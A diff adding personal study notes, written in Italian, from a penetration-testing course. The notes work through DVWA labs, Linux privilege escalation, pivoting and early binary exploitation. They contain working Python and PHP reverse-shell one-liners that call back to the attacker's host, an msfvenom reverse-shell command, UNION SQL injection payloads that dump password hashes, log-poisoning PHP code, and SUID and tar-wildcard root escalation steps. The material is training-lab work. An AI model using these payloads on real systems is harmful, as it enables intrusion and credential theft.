@@ -1,0 +1,1054 @@
+dvwa:
+
+bruteforce:
+devo capire quali sono le risposte quando ho le credenzaiali errate e corrette
+
+provo "admin - ciaociao" e vedo che mi dà l'output, così "Username and/or password incorrect."
+uso burpsuite
+	configurazione con foxyproxy
+	
+	vedo che premendo login, vedo l'intercept su burp ed ho:
+	
+	GET /DVWA/vulnerabilities/brute/?username=admin&password=password&Login=Login HTTP/1.1
+	Host: localhost
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate, br
+	Connection: close
+	Referer: http://localhost/DVWA/vulnerabilities/brute/?username=admin&password=ciaociao&Login=Login
+	Cookie: security=low; PHPSESSID=hhooq2spvvjkvhvlu9h3db4p7h
+	Upgrade-Insecure-Requests: 1
+	Sec-Fetch-Dest: document
+	Sec-Fetch-Mode: navigate
+	Sec-Fetch-Site: same-origin
+	Sec-Fetch-User: ?1
+
+
+	vedo: 1) richiesta con get
+	      2) ho due cookie, di cui uno che identifica la sessione PHP e anche il cookie per la difficoltà della acchina
+	      
+	      
+provo a levare il PHPSESSID e mi risponde:
+
+	HTTP/1.1 302 Found
+	Date: Thu, 18 Apr 2024 08:50:07 GMT
+	Server: Apache/2.4.58 (Debian)
+	Set-Cookie: PHPSESSID=9eiuhgii2bl8ttks9fbv6dm7tn; path=/
+	Expires: Thu, 19 Nov 1981 08:52:00 GMT
+	Cache-Control: no-store, no-cache, must-revalidate
+	Pragma: no-cache
+	Location: ../../login.php  <--- vedo questo
+	Content-Length: 0
+	Connection: close
+	Content-Type: text/html; charset=UTF-8
+	
+	
+faccio tentativo di attacco con Hydra
+
+
+
+hydra 127.0.0.1 -l admin -P /usr/share/wordlist/rockyou.txt http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie:PHPSESSID=hhooq2spvvjkvhvlu9h3db4p7h;security=low"
+
+-----------------------
+
+ping
+
+vedo che se metto 8.8.8.8 mi esce un risultato, ma vedo che se faccio "8.8.8.8; whoami" mi stampa www-data, allora esegue ogni comando (e.g. ; cat  /etc/passwd)
+allora cerco di fare una reverse shell
+sul sito: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md e vado sulla reverse shell
+
+oppure ho il tool: https://www.revshells.com metto il mio ip e su di me metto in listening invece il payload lo faccio eseguire alla macchina
+
+
+se non va uno, prova altri, una che funziona quasi sempre è quella Python #2 (oppure php e lo testo sempre con which php)
+
+provo prima però se è installato facendo 8.8.8.8; which python
+
+e mi stampa "/usr/bin/python"
+
+nel form faccio: 
+8.8.8.8; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.15",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+
+sul mio terminale:
+nc -lvnp 9001
+
+ed ho la reverse shell ed ora posso usare i comandi (che potevo eseguire anche prima) più facilmente 
+
+-----
+aumentato la difficoltà e vedo che ho una black list però posso usare l'OR
+facendo 8.8.8.8 || id però non va, perchè fa il secondo solo quando il primo è falso, allora per far fallire il primo, posso mettere un IP non valido tipo 8.8.8.300 (perchè arrivo fino a 256) e mi stampa
+
+
+aumento ad high, aumenta blacklist e vedo che non posso usare '| ' però la pipe la posso usare (senza spazio)
+quindi 8.8.8.8|id
+---------
+
+file inclusion
+file1.php e vedo sull'url cosa prende e vedendo anche il source code, mi fa una GET, ora provo a mettere nell'url, /etc/passwd
+
+http://localhost/DVWA/vulnerabilities/fi/?page=/etc/passwd
+(tanto ci possono accedere tutti) e me lo stampa a video, allora io cerco di includere un file, e faccio:
+vado su "file upload" e creo un file con una reverse shell PHP "PHP cmd" e creo file con il codice creato dal sito di prima
+e la uploado
+
+e mi dice "../../hackable/uploads/reverseshell.php succesfully uploaded!"
+
+allora copio la stringa e su file inclusion la incollo nell'url e posso eseguire comandi ma non va, apro burp (dopo aver attivato foxyproxy)
+
+e intercetto GET
+
+e vedo 
+
+GET /DVWA/vulnerabilities/fi/?cmd=id HTTP/1.1  <-- infatti vedo che lui non esegue il pezzo di url aggiunto allora modifico *
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Referer: http://localhost/DVWA/vulnerabilities/fi/?page=../../hackable/uploads/reverseshell.php
+Cookie: security=low; PHPSESSID=mfq9btm09ad31jpgea7sjcs5eo
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+
+* e la modifico così 
+http://localhost/DVWA/vulnerabilities/fi/?page=../../hackable/uploads/reverseshell.php&cmd=id
+
+e mi stampa quello che voglio, e da qui posso fare quello che voglio essendo una reverse shell
+
+-------------------SQL INJECTION
+
+vedo il codice sorgente (low diff)
+la query è: "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 
+
+vedo che posso passare un commento, cioè --, e metto anche qualcosa di dopo, così sono sicuro che mi venga interpretato come commento, metto "-- ciao" -> non mi restituisce niente 
+perchè?
+qualcosa è andato male. cioè in teoria doveva restituirmi tutti gli id
+
+prendendo la query, vedo che finisce con singolo apice, quindi il commento mi viene interpretato come una stringa e non funziona, quindi quello che vado a fare provo a mettere l'apice e mi dà errore perchè la query diventa:
+"SELECT first_name, last_name FROM users WHERE user_id = ''';"; e quindi mi rimane un singolo apice aperto e non chiuso e dà errore
+
+quindi provo a rimettere il commento, però provando a fare ' -- ciao -> e comunque non mi dà nulla perchè mi va a cercare un utente in cui id = '' (stringa vuota) e quindi non esiste un utente così, e non lo stampa
+
+quindi metto 1 OR 1=1 e così mi stampa tutti gli utenti
+QUINDI nel form metto -> ' -1 OR 1=1 -- ciao e mi stampa:
+
+ID: ' -1 OR 1=1  -- ciao
+First name: admin
+Surname: admin
+
+ID: ' -1 OR 1=1  -- ciao
+First name: Gordon
+Surname: Brown
+
+ID: ' -1 OR 1=1  -- ciao
+First name: Hack
+Surname: Me
+
+ID: ' -1 OR 1=1  -- ciao
+First name: Pablo
+Surname: Picasso
+
+ID: ' -1 OR 1=1  -- ciao
+First name: Bob
+Surname: Smith
+
+
+ora voglio trovare anche altre info sugli utenti, che saranno in altre tabelle ed usando una UNION unisco più tabelle e stampo tutti i dati che mi servono
+quindi partendo dalla SQLi di prima la estendo con altri comandi
+
+però io normalmente non so quante colonne ho quindi devo scoprirlo e quindi posso usare:
+
+1) order by
+
+ed aumento l'indice della colonna, finche non mi dà errore, quindi significa che ho superato il numero di colonne e quindi conosco 
+
+' OR 1=1 ORDER BY 1 -- ciao
+
+
+
+2) union select
+provo: ' OR 1=1 UNION SELECT 1 -- ciao
+e provo mettendo 1,2 etc finchè non ho più errore
+
+quindi ora devo scoprire il nome del DB e delle tabelle per capire su che tabella fare la UNION di prima
+quindi come prima cosa faccio:
+' -1 OR 1=1 UNION SELECT 1,database() -- ciao
+trovo che si chiama 'dvwa'
+
+per trovare il nome delle tabelle uso la stringa: (varia tra DB e DB, mariaDB usa come tabella di sistema information_schema)
+
+' -1 OR 1=1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa' -- ciao
+
+e mi stampa:
+
+ID: ' -1 OR 1=1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa' -- ciao
+First name: 1
+Surname: guestbook,users
+
+
+
+poi eseguendo:
+' -1 or 1=1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' -- ciao
+mi stampa:
+
+ID: ' -1 or 1=1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' -- ciao
+First name: 1
+Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login
+
+quindi ora so i nomi delle colonne, allora attraverso la query:
+
+' -1 or 1=1 union select 1,group_concat(user, ':', user_id, ':', first_name, ':', last_name, ':', password SEPARATOR '<br>') from users -- ciao
+ottengo:
+
+ID: ' -1 or 1=1 union select 1,group_concat(user, ':', user_id, ':', first_name, ':', last_name, ':', password SEPARATOR '<br>') from users -- ciao
+First name: 1
+Surname: admin:1:admin:admin:5f4dcc3b5aa765d61d8327deb882cf99
+gordonb:2:Gordon:Brown:e99a18c428cb38d5f260853678922e03
+1337:3:Hack:Me:8d3533d75ae2c3966d7e0d4fcc69216b
+pablo:4:Pablo:Picasso:0d107d09f5bbe40cade3de5c71e9e9b7
+smithy:5:Bob:Smith:5f4dcc3b5aa765d61d8327deb882cf99
+
+
+dopo aver trovato la password, potrebbe essere molto probabile che la stessa password è riutilizzata per esempio in ssh etc
+
+
+-----SQLi medium ora ho solo un ingresso pilotato diciamo
+
+come faccio? mi catturo la query con burp 
+e trovo che la richiesta è:
+
+POST /DVWA/vulnerabilities/sqli/ HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 18
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/DVWA/vulnerabilities/sqli/
+Cookie: security=medium; PHPSESSID=tnrr8ril7reeb18h9o4lai5d8u
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+id=1&Submit=Submit <- vedo che qui posso modificare l'id e quindi metto l'apice singolo per vedere se mi dà errore o meno, ed effettivamente me lo dà
+però ora può essere che molti caratteri non li posso utilizzare, perchè ora parlo con HTTP con la richiesta e quindi può essere che va in errore per una sola parte della query e non tutta
+
+QUIDNI sul repeater seleziono la stringa con id...
+poi faccio tasto dx, convert selection, url, url encode key characters
+
+quindi faccio 
+
+
+---SQLi high
+
+metto l'id, il fatto è che poi vedendo il codice, vedo che ha il limit, però così posso usare un costrutto SQL per farmi tornare un solo risultato, su una sola riga, ma se ho più tabelle la seconda non la vedo perchè
+restituisce solo quella della prima tabella, quindi dovrei azzerare la prima tabella e metto una cosa sempre falsa, tipo ' 1 or 1=0 union etc... e mi permette di vedere il contenuto della seconda tabella 
+
+(uso concat per concatenare due risultati in uno solo)
+
+
+--------------------XSS Cross Site Scripting
+provo a vedere se riesco a bypassare il login di DVWA 
+
+mi metto con burp, e nel login provo a mettere '
+
+e mi dà:
+
+POST /DVWA/login.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 78
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/DVWA/login.php
+Cookie: security=low; PHPSESSID=3q2088hagshqi740q0ls5uad8h
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+username=%27&password=&Login=Login&user_token=7434b8d29b90167eee3855e685f76086  <- vedo che mi traduce ' in %27
+
+provo a fare admin' OR 1=1 -- ciao
+
+però mi dà login failed, quindi in teoria l'hanno fatta corretamente, ora accedo a DVWA e vado su bruteforce (scurity: high)
+
+provo con: admin' OR 1=1 -- ciao -> ma mi da comunque login incorretto perchè vedendo il codice mi fa un escape degli apici etc, e li leva
+
+metto low: e mettendo ' in username, funziona
+
+e se metto: ' OR 1=1 LIMIT 1 -- ciao nello user e password a caso, bypasso il login, perchè mi prende solo il primo che vede e quindi admin, senza limit mi prenderebbe più utenti e darebbe problemi
+
+---File inclusion, vado a mettere codice in access.log e poi lo richiamo così eseguo il codice
+quindi devo capire se posso accedere come prima cosa all'access.log e di solito sta in var/log/apache2/ (perchè stiamo con apache) e facendo ls -la vedo che access.log ha -rw-r----- e vario i permessi con chmod o+r access.log
+
+ed ora posso fare una reverse shell, e creo un codice php che posso modificare per esempio posso farci stampare il nome dell'utente attuale che sta eseguendo il codice:
+
+clicco su file1.php con burp accesso prendo la richiesta e vedo:
+
+GET /DVWA/vulnerabilities/fi/?page=file1.php HTTP/1.1
+Host: localhost
+User-Agent: -> METTO QUESTO <?php system(whoami); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Referer: http://localhost/DVWA/vulnerabilities/fi/?page=include.php
+Cookie: security=low; PHPSESSID=g51qdt7mgcg9uup3509r3o19vf
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+la sezione riscritta su access.log, che non crea problemi è lo user-agent e qui ci metto il mio codice php
+
+e dal repeater di burp mando la richiesta, e gliela forwardo e nell'access.log mi salva la richiesta e in access.log vedo che c'è
+
+ora nel'url metto ../../../../../../../var/log/apache2/access.log mi dà errore e questo perchè tutte le cartelle che stanno nel path fino ad access.log devono avere il permesso di esecuzione e lettura allora faccio anche
+
+ed ora cercando ->http://localhost/DVWA/vulnerabilities/fi/?page=/../../../../../../../var/log/apache2/access.log mi stampa tutto l'access.log
+
+allora intercetto query con burp, e la modifico:
+
+GET /DVWA/vulnerabilities/fi/?page=file1.php HTTP/1.1
+Host: localhost
+User-Agent: <?php include(system.php); ?> <-- QUI
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Referer: http://localhost/DVWA/vulnerabilities/fi/?page=include.php
+Cookie: security=low; PHPSESSID=g51qdt7mgcg9uup3509r3o19vf
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+ora invio e vedo cosa stampa dal sito, sempre con il metodo dell'url
+
+
+quindi vado sul sito per fare revers-shell, faccio la reverse shell di php
+
+
+e la metto nella richiesta intercettata php -r '$sock=fsockopen("127.0.0.1",9001);exec("sh <&3 >&3 2>&3");'
+e su terminale mi metto in ascolto: nc -lvnp 9001
+
+
+----PRIVILEGE ESCALATION E PIVOTING, BINARY REVERSE, EXPLOITATION E BUFFER OVERFLOW
+
+LinPeas (su github) (tutorial: https://www.youtube.com/watch?v=9_fJv_weLU0&list=PL9fPq3eQfaaDxjpXaDYApfVA_IB8T14w7)
+lo vediamo passo passo
+(cheatsheet: https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
+
+tryhackme: https://tryhackme.com/r/room/linuxprivesc
+
+1) kernel exploit
+difficile da proteggersi, per trovarlo, cercare release del kernel
+=> cat /proc/version
+	=> uname -a 
+
+poi cerco un exploit per il kernel, e passo root da lì
+
+il kernel exploit più famoso è: dirty cow, crea un nuovo utente con permessi di root
+non si usano, perchè se sulla macchina non funziona, allora si blocca il kernel e quindi la macchina
+----
+
+di solito scarico il sorgente e poi lo compilo sulla macchina che sto attaccando con gcc, se non si può compilare allora tocca fa na magagna bohh
+
+
+
+cerco l'exploit su exploitdb oppure searchsploit 
+
+---
+per passare i file uso:
+
+scp oppure sulla macchina mia attivo un python server con i tool da passare che poi sulla macchina target, in cui io ho fatto accesso, con wget li prendo
+
+guardare output più volte 
+
+-------
+
+servizi che girano come root ma non devono esserlo
+eg. mysql e probabilmente ci sta una vulnerabilità
+	non dovrebbe girare come root, perchè ci sta la UDF (User Defined Functions), sono funzioni che possono essere eseguite nel DB
+	(https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf?rss)
+
+
+ps aux -> trovo lista dei servizi poi se faccio -> ps aux | grep "root" mi fa vedere solo quelli root
+ps
+
+servizi che girano come root, mal configurati tipo:
+cat /etc/syslog
+
+
+
+--
+SUID binaries
+
+se SUID bit è attivato su un file, allora parte con i permessi dell'utente che lo ha creato
+
+per trovare file che ci permette di eseguire qualcosa uso:
+sudo -l #Check commands you can execute with sudo
+find / -perm -4000 2>/dev/null #Find all SUID binaries
+
+per vedere cosa posso fare con i vari servizi che hanno SUID settato ad 1: https://gtfobins.github.io/ -> per esempio python: https://gtfobins.github.io/gtfobins/python/ poi ctrl+f "suid" e
+
+nella macchina:
+
+sudo -l e vedo i comandi che posso eseguire, quindi posso andare su gtfobins e vedo come fare
+
+>sudo env var section
+
+user@debian:~/tools/mysql-udf$ sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+user@debian:~/tools/mysql-udf$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+user@debian:~/tools/mysql-udf$ sudo LD_PRELOAD=/tmp/preload.so man
+root@debian:/home/user/tools/mysql-udf# whoami
+root
+
+oppure se uso da user uno dei comandi, li cerco su gtfobins e vedo nella sezione sudo, e vedo come eseguire, molte volte non sono su bash e allora scivo "bash" (opzionale)
+-----
+
+mi collego alla macchina di tryhackme (linux privesc)
+
+cronjobs > lancio comandi in maniera periodica in maniera automatica, usati per pulire log/cache etc, quindi si possono lanciare per prendere il root
+posso eseguirli con tanti intervalli, giorno del mese, della settimana etc
+cioè gira solo il terzo mese dell'anno di mercoledì (etc)
+quelli che ci interessano sono quelli che girano come root
+
+come lo trovo?
+crontab -l (funziona di meno ci da quelli del mio utente)
+ls -al /etc/cron* /etc/at*
+cat /etc/cron*
+
+
+-----
+
+
+-------
+
+user@debian:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin  <- in ordine di importanza
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+^^^ cronjob che girano come root, le cose che ci interessano, sono i path a 465, continua finchè non trova un path relativo nell'eseguibile, e di solito non ho /home/user nel PATH dei cronjob => è una vuln
+	a noi interessano i cj (cronjob) che girano come root, o come l'utente che volgio exploitare
+	
+1) vedo s e posso leggere i due exe che sta eseguendo
+
+e facciamo find per trovarlo (ridirect errori in null)
+
+user@debian:~$ find / -name "overwrite.sh" 2> /dev/null
+/usr/local/bin/overwrite.sh
+
+user@debian:~$ cat /usr/local/bin/overwrite.sh 
+#!/bin/bash
+
+echo `date` > /tmp/useless
+
+non ho niete di che, vedo l'altro file
+
+user@debian:~$ cat /usr/local/bin/compress.sh
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+=> https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa
+
+ho una wildcard e ci interessano, allora con il comando tar posso fare qualcosa, quindi devo capire cosa sta eseguendo
+
+perchè con la wildcard posso sostituire tutto che mi interessa nel comando, quindi se creo un file, che ha come nome un comando linux, allora verrà eseguito il comando
+
+se ho un path prima o un ./ prima allora non va tipo /etc/at/* non va e neanche ./*
+
+
+user@debian:~$ cat /usr/local/bin/compress.sh
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+=> https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa
+vedo il flag: checkpoint-action
+
+user@debian:/home$ cd user/
+user@debian:~$ ls
+myvpn.ovpn  overwrite.sh  tools
+user@debian:~$ cp overwrite.sh shell.sh
+user@debian:~$ mkdir /tmp/wildcard
+user@debian:~$ echo "" > --checkpoint=1
+user@debian:~$ echo "" > "--checkpoint-action=exec=sh shell.sh"
+user@debian:~$ ls /tmp
+backup.tar.gz  rootbash  useless  wildcard
+e rifaccio ./rootbash -p
+
+
+
+
+
+allora se creo un file overwrite.sh e lo metto in home/user allora verrà eseguito prima, e che ci metto dentro?
+reverse shell, script matto oppure meto una versione di bash con il SUID attivato, allora quando chiamo bash, me lo chiama come root
+
+allora uso:
+
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash  <- copio vers orginiale di bsah in una nuova cartella
+chmod +xs /tmp/rootbash		<- rendo d
+
+user@debian:~$ nano /home/user/overwrite.sh
+user@debian:~$ chmod +x /home/user/overwrite.sh 
+user@debian:~$ ls /tmp
+controllo ogni tot in /tmp ed ho
+user@debian:~$ ls /tmp
+backup.tar.gz  rootbash  useless
+user@debian:~$ cd /tmp
+user@debian:/tmp$ ./rootbash -p
+sono root
+
+
+
+
+
+uso di pspy
+scarico pspy (sta su download), me lo passo sulla macchina vittima in qualche modo e poi faccio ./pspy
+
+
+altro tipo di cronjob:
+
+lo prendo da pspy (prima va messo in chmod +x)
+user@debian:/tmp$ find / -name "myvpn.ovpn" 2> /dev/null
+/home/user/myvpn.ovpn
+
+
+PATH abuse exploit:
+
+1 tipo) 
+il cronjob, è relativo lui stesso
+
+2 tipo) 
+nel file che sta eseguendo il cj ci sta un path relativo (più complesso del primo)
+
+
+
+
+
+---- pivoting 
+
+passare da una macchina all'altra per cercare di ottenere privilegi, cioè mi muovo all'interno della sottorete, eg activedirectory di windows
+
+tool chisel (scalpello)
+
+port knocking, la connessione si instaura solo quando faccio nknocking tra le porte, sennò si vederebbe la porta aperta  (comando linux: knockd)
+
+
+
+
+se prendo shell come www data
+
+la cosa più sempliche posso fare è mettere la chiave ssh nella cartella .ss, così ho shell ssh stabile 
+
+posso fare il cmoando cno python, perl, php etc
+
+oppure mi apro la shell e poi faccio i comandi sulle slide per beautify your shell
+
+
+
+---tunneling
+uso ssh
+local forwarding e remote forwarding (
+
+KALI|-----|VICTIM|------|SERVER
+
+local:
+       |------Sulla mia subnet-||---quello che vede la vittima per prendere la risorsa remota--|
+ssh -L doveesporreilservizio:80:serviziochevoglioprendere:porta user@ip per collegarsi ad ssh 
+ssh -L 127.0.0.1:80:intra.example.com:80 gw.example.com
+
+ssh -L 127.0.0.1:443:10.254.254.2:443 master@10.0.253.10
+
+
+remote:
+ssh -R 8080:localhost:80 user@ip
+       |-dove metto risorsa-||-risorsa visibile da kali e porta-||-collegamento ssh-| 
+       
+       
+tool chisel:
+
+creo tunnel usando HTTP, creo tunnel trasparenti tra macchine 
+
+poi lo trasporterò sulla macchina vittima, ho due versione client e server:
+
+macchina attaccante:
+creo server chisel
+./chisel server -p 8001 --socks5 --reverse
+
+macchina target:
+trasport exe
+./chisel client ipattacker:8001 R:1080:socks
+
+serve poi proxychains4 
+
+proxychains -q ipsottoreteprivata
+
+devo dirgli dove trova il tunnel per indirizzare il traffico
+mousepad etc/proxychains4
+socks5	 127.0.0.1:1080
+
+
+vado sul server:
+./chisel server -p 8003 --socks5 --reverse
+
+sulla macchina interna 2:
+
+chisel.exe client
+
+
+poi dall'admin machine, così lui si potrà collegare ai pc che lui vede e quindi posso eedere e collegarmi a tutta la rete dalla mia macchina
+
+tar wildcard injection
+
+----------------------------------------------------
+
+binary exploitation
+
+fasi di compilazione con gcc
+1- preprocessing, mi risolve le macro
+2- compilazione, ho un oggetto assembler del codice con il tag -s 
+3- assembly, ogni istruzione assembler è trasformata in un byte corrispettivo -o
+4- linking, significa inserire dentro al file bject, per esempio quando faccio include lib, allora dico, quando carichi questo binario, ho bisogno di questi file, quindi il programma deve mettere al suo interno quali librerie devono essere caricate.
+	statico o dinamico
+	statico: tutte le librerie che voglio, le voglio dentro al file, e quindi ho una copia delle librerie che mi servono nel file, e sicuramente so che il mio programma funzione
+	dinamico: le librerie le linko, ma nel file non le carico e quindi quando il file viene runnato nelle macchine, e allora spero che le librerie che mi servono sono nella macchina, è più rischioso, se il pc non ha quella 				 libreria, ma il file è molto più leggero
+
+
+se faccio > file <nomefile> mi dice come è linkato
+se faccio > strace <nomefile> mi dice quali sys call sta usando
+
+assembly=> registri AX,BX,CX,DX,IP,SP,BP
+
+lo stack è diviso in frame, ed ogni func ha un suo frame, ed è dove carico le sue variabili locali, e mi devo ricordare dove inizia il frame per accedere le variabili, e lo faccio attraverso il BP, mentre lo SP mi dice quanto devo aumentare, lo SP diminuisce all'aumentare della dimensione dello stack. Interagisco con lo stack attraverso le istruzioni push e pop
+
+stack è importante per le calling convention, come faccio a capire dove sta la funzione che io chiamo? ci dobbiamo mettere d'accordo per capire dove stanno le variabili
+ci stanno molte call.conv. ma noi guardiamo quelle di gcc.
+le c.c. fanno parte di un sistema più grande ABI, application binary interface 
+
+se pusho una func, nello stack ho "indirizzo di ritorno" che va sempre in EAX, poi ho i parametri della func da sinistra a destra
+quando finisce funzione, lo stack è pulito dal caller stesso, ma dipende dalle ABI, e questo potrebbe essere un problema quando il caller mi dà più argomenti di quelli che mi aspetto
+
+per esempio, la func si aspetta 3 argomenti, gliene passo 4, ora però ne ho uno in più nello stack
+
+ad inizio di ogni func, ho un epilogo e viene fatto un push il valore dello stack frame, e viene posto lo stack pointer per far entrare i valori della func
+
+
+--
+
+
+
+reversing a program
+
+statico
+faccio reversning senza eseguire il binario, per carpire se è malevolo o benevolo
+
+posso accedere allo stack direttamente tramite indirizzo,
+
+
+dinamica
+analizzo il programma mentre lo sto lanciando
+
+tool tipo strace, tracciamento sys call, conviene partire dalla fine, le prime non sono utili
+oppure ltrace, e mostra la chiamata a libreria
+
+
+gdb
+
+jeff/pwndbg
+chiama tutti i comandi quando viene chiamato, e gli posso dare un insieme di comandi
+i comandi più importanti sono
+
+n next -> vado avanti di un istr senza entrare nelle func
+s step -> vado avanti di un istr entrando nelle func
+c    -> vado avanti finchè no ntrovo breakpoint
+
+gdb si ferma, se ho interrupt oppure se ho una read e quindi asptto un input dell'utente
+
+
+
+----- pwn tools (https://docs.pwntools.com/en/stable/context.html)
+╭─      ~ ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 127 ✘  7s    14:14:28   
+╰─ python3                    
+Python 3.11.9 (main, Apr 10 2024, 13:16:36) [GCC 13.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from pwn import *
+>>> 
+
+suppongo di trovare in memoria:
+0xDEADBEEF 
+quindi ora faccio
+>>> p32(0xDEADBEEF)  <- per 32 bit sennò uso 
+b'\xef\xbe\xad\xde'
+
+e mi inverte i bit
+
+se uso >>> u32(b'\xef\xbe\xad\xde') mi ritorna a quello di prima (cioè da HEX)
+
+---- CARTELLA ESEMPI
+in PWNTOOLS random  
+pwntools_script.py
+
+
+fa anche assembling e disass
+
+binari già prefatti nella livreria shellcraft
+
+from pwn import *
+print(shellcraft.cat("/etc/passwd")) e faccio:
+
+sc = asm(shellcraft.cat("/etc/passwd")) e così ho che se la printo ho tutto in HEX
+
+posso sennò usare "msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f c" e mo mi dà la stessa cosa
+
+e in python poi faccio
+
+
+
+----- faccio shellcode injection in sistemi a32 bit
+
+quindi, ora non funge più perchè cisono prevenzioni
+--call della funzione, viene pushato alla cima dello stack il valore del Istruction Pointer
+
+vai su cartella gdb32stack_shellcode
+quindi eseguo il codice con
+gcc -fno-stack-protector -zexecstack -no-pie -m32 vuln.c -o vul */   <- zexecstack serve perchè lo voglio rendere eseguibile 
+disabilito aslr
+
+echo 0 > /proc/sys/kernel/randomize_va_space <- si rimette ad ogni riavvio, così non si randomizza lo stack per protezione 
+
+avvio il programma con gdb, e vedo che facendo start, poi vedo che lo stack è eseguibile (dipende anche dal kernel) e vedo che ho [rwx] stack ==> ho vulnerabilità
+
+faccio script con pwntools in py
+
+from pwn import *
+context.terminal(....qualcosa....)
+
+#1 overwrite return address
+p = process("./vuln")
+gdb.attach(p, '''    <- serve per attaccare pwntools con gdb
+b *(vuln+95)  <- breakpoint
+
+
+c
+''')
+
+facendolo partire, vedo che si ferma
+
+
+ora apro con ghidra il file vuln (eseguibile) (oopure con IDA, e deve essere connesso ad internet per funzionare, e vedo che facendo F5 trovo il decompilato e poi con TAB switcho tra decompilato e programma)
